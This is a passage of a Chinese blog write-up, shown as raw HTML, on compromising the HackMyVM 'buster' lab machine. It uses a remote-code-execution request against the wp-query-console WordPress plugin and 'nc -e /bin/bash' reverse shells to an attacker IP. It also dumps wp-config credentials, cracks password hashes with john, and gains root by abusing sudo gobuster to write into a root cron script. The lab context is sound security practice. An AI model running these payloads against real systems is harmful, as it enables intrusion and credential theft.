class="symbol">//www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">1.0</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs <span class="operator">-</span> <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">10</span> <span class="symbol">/</span> <span class="number">10</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line"></span><br><span class="line">[i] User(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] ta0</span><br><span class="line"> | Found <span class="params">By:</span> Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-json<span class="operator">/</span>wp<span class="operator">/</span>v2<span class="operator">/</span>users<span class="operator">/</span><span class="operator">?</span>per_page<span class="operator">=</span><span class="number">100</span>&amp;page<span class="operator">=</span><span class="number">1</span></span><br><span class="line"> | Confirmed <span class="params">By:</span></span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] welcome</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WPScan DB API OK</span><br><span class="line"> | <span class="params">Plan:</span> free</span><br><span class="line"> | Requests Done (during the scan): <span class="number">3</span></span><br><span class="line"> | Requests <span class="params">Remaining:</span> <span class="number">21</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Finished:</span> Wed Feb  <span class="number">5</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">51</span> <span class="number">2025</span></span><br><span class="line">[<span class="operator">+</span>] Requests <span class="params">Done:</span> <span class="number">108944</span></span><br><span class="line">[<span class="operator">+</span>] Cached <span class="params">Requests:</span> <span class="number">43</span></span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Sent:</span> <span class="number">29.459</span> MB</span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Received:</span> <span class="number">33.016</span> MB</span><br><span class="line">[<span class="operator">+</span>] Memory <span class="params">used:</span> <span class="number">423.633</span> MB</span><br><span class="line">[<span class="operator">+</span>] Elapsed <span class="params">time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">16</span></span><br></pre></td></tr></table></figure></div>
+<p>足足扫了一个多小时啊  可以看到有两个用户 tao0和welcome<br>插件也扫出来三个可以利用的是wp-query-console<br>搜索一下这个插件,找到poc</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-json/wqc/v1/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>kubernetes.docker.internal</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://kubernetes.docker.internal</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;queryArgs&quot;</span><span class="punctuation">:</span><span class="string">&quot;phpinfo();&quot;</span><span class="punctuation">,</span><span class="attr">&quot;queryType&quot;</span><span class="punctuation">:</span><span class="string">&quot;post&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure></div>
+<p>把host改一下就可以直接使用,<br><img src="https://pic1.imgdb.cn/item/67a342b0d0e0a243d4fbf73d.png"><br>可以看到ban了一些函数 但是没有ban shell_exec<br>ping本机,然后在本机测试是否shell_exec可以利用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# tcpdump icmp </span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">17:25:17.256362 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:17.256445 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:18.261902 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">17:25:18.261977 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br></pre></td></tr></table></figure></div>
+<p>反弹shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="built_in">shell_exec</span>(&#x27;nc -e /bin/bash <span class="number">192.168</span>.<span class="number">240.83</span> <span class="number">1234</span>&#x27;);&quot;</span><br></pre></td></tr></table></figure></div>
+<p>成功拿到shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到shell之后看wordpress的配置文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@listen</span><span class="symbol">:~/html/wordpress</span><span class="variable">$ </span>cat wp-config.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LASSO"><figure class="iseeu highlight /lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ** Database settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database username */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ll104567&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database password */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;thehandsomeguy&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database hostname */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The database collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br></pre></td></tr></table></figure></div>
+
+<p>发现数据库泄露 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; select <span class="symbol">*</span> from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string"> ID </span>|<span class="string"> user_login </span>|<span class="string"> user_pass                          </span>|<span class="string"> user_nicename </span>|<span class="string"> user_email        </span>|<span class="string"> user_url              </span>|<span class="string"> user_registered     </span>|<span class="string"> user_activation_key                           </span>|<span class="string"> user_status </span>|<span class="string"> display_name </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> ta0        </span>|<span class="string"> $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. </span>|<span class="string"> ta0           </span>|<span class="string"> 2814928906@qq.com </span>|<span class="string"> http://192.168.31.181 </span>|<span class="string"> 2025-01-08 03:10:43 </span>|<span class="string">                                               </span>|<span class="string">           0 </span>|<span class="string"> ta0          </span>|</span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> welcome    </span>|<span class="string"> $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ </span>|<span class="string"> welcome       </span>|<span class="string"> 127.0.0.1@qq.com  </span>|<span class="string">                       </span>|<span class="string"> 2025-01-08 04:29:28 </span>|<span class="string"> 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. </span>|<span class="string">           0 </span>|<span class="string"> welcome      </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.014 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress]&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>得到两个用户名和密码,然后用john可以跑出来welcome的密码,接下来就切换到welcome用户操作</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># john tmp                                                                             </span></span><br><span class="line">Using default input <span class="params">encoding:</span> UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (phpass [phpass ($P$ <span class="keyword">or</span> $H$) <span class="number">128</span><span class="symbol">/128</span> ASIMD <span class="number">4</span>x2])</span><br><span class="line">Cost <span class="number">1</span> (iteration count) is <span class="number">8192</span> for all loaded hashes</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to <span class="built_in">abort</span>, almost any other key for status</span><br><span class="line">Almost <span class="params">done:</span> Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:<span class="symbol">/usr/share/john/password.lst</span></span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line"><span class="number">104567</span>           (<span class="operator">?</span>)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">22</span> DONE <span class="number">3</span><span class="symbol">/3</span> (<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">18</span>:<span class="number">05</span>) <span class="number">0.04403</span>g<span class="symbol">/s</span> <span class="number">8169</span>p<span class="symbol">/s</span> <span class="number">8169</span>c<span class="symbol">/s</span> <span class="number">8169</span>C<span class="symbol">/s</span> milling1..<span class="number">192011</span></span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+<p>有一个gobuster的sudo权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> welcome on <span class="symbol">listen:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> welcome may run the following commands on <span class="symbol">listen:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/gobuster</span><br></pre></td></tr></table></figure></div>
+<p>现在需要我们用一个pspy64程序看定时任务 下载地址在<br><code>https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">welcome@listen:~$ wget <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">1</span>5--  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.1</span>s    </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">15</span> (<span class="number">30.4</span> MB<span class="operator">/</span>s) <span class="operator">-</span> ‘pspy64’ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">welcome@listen:~$ chmod <span class="number">777</span> pspy64</span><br><span class="line">welcome@listen:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2047</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2048</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2049</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2050</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2051</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2052</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br></pre></td></tr></table></figure></div>
+<p>看到root会定时写入&#x2F;opt&#x2F;.test.sh<br>所以我们的目标就是在.test.sh中写入文件 （反弹shell）<br>大佬们的思路太nb了,就是利用gobuster输出结果的回显来写入命令<br>具体是这样的: 在本机开http服务,创建文件夹，在靶机用gobuster自己创一个字典，指向我们在本机的文件夹，这样就会显示靶机中字典文件中的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> ──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# touch a</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /f7c3be62-4f83-404f-9236-89f88603c3f8 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /a HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ touch a.txt     </span><br><span class="line">welcome@listen:/tmp$ echo <span class="string">&quot;a&quot;</span> &gt; a.txt </span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">/a</span><br></pre></td></tr></table></figure></div>
+<p>因为gobuster找到字典中可以访问的目录就会显示 <code>-q -n</code>是为了不输出banner和状态码<br>这样字我们就可以写反弹shell了 用-o将结果输出到&#x2F;opt&#x2F;.test.sh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># touch b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e /bin/bash 192.168.240.83 1234 &quot;</span> &gt; b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">777</span> b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;tmp/b&quot;</span> &gt; b.txt</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo gobuster -u <span class="number">192.168</span>.<span class="number">240.83</span> -w b.txt -q -n -o ┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="symbol">bash:</span> syntax error near unexpected token `(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">2025/02/05 05:42:21 [!] unable to connect to http://192.168.240.83/: Get http://192.168.240.83/: dial tcp 192.168.240.83:80: connect: connection refused</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br></pre></td></tr></table></figure></div>
+<p>用我这种方式扫目录，要在本机主目录下开http，不然没有tmp目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# nc -lp 1234              </span><br><span class="line">id</span><br><span class="line">  </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>
+
+<p>总结：1 wordpress的插件扫描以及常见的利用 2 gobuster或者目录扫描工具的读取敏感文件通用思路</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/7142.html" title="HMV-buster">https://guayu-kakeru.github.io/posts/7142.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/55566.html" rel="prev" title="HMV-jan">
+      <i class="fa fa-chevron-left"></i> HMV-jan
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/8393.html" rel="next" title="IA: Keyring">
+      IA: Keyring <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
